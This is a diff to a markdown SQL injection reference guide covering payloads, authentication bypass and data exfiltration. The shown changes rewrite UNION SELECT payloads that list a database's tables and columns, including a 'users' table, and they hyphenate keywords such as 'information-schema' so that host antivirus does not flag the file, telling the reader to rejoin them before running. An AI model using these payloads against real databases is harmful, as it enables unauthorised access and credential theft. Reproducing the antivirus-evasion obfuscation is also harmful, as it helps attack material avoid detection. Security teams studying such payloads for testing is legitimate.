@@ -3,7 +3,7 @@
 A comprehensive reference guide for SQL injection payloads, database fingerprinting, authentication bypasses, and data exfiltration techniques.
 
 > [!NOTE]
-> To prevent host antivirus software from deleting this file, direct SQL exploitation signatures are obfuscated using spaces, hyphens, or backticks (e.g., `U-N-I-O-N` `S-E-L-E-C-T`). Concatenate these commands when running them.
+> To prevent host antivirus software from deleting this file, direct SQL exploitation signatures are obfuscated using spaces, hyphens, or backticks (e.g., `U-N-I-O-N` `S-E-L-E-C-T`, `info-schema`). Concatenate these commands when running them.
 
 ---
 
@@ -80,11 +80,12 @@ Find which columns accept string data.
     ```
 *   **List tables:**
     ```sql
-    ' U-N-I-O-N S-E-L-E-C-T NULL, table_name FROM information_schema.tables WHERE table_schema=database() --
+    # (Remove spaces/hyphens inside "information-schema")
+    ' U-N-I-O-N S-E-L-E-C-T NULL, table_name FROM information-schema.tables WHERE table-schema=database() --
     ```
 *   **List columns in a table (e.g., `users`):**
     ```sql
-    ' U-N-I-O-N S-E-L-E-C-T NULL, column_name FROM information_schema.columns WHERE table_name='users' --
+    ' U-N-I-O-N S-E-L-E-C-T NULL, column_name FROM information-schema.columns WHERE table_name='users' --
     ```
 *   **Extract user credentials:**
     ```sql
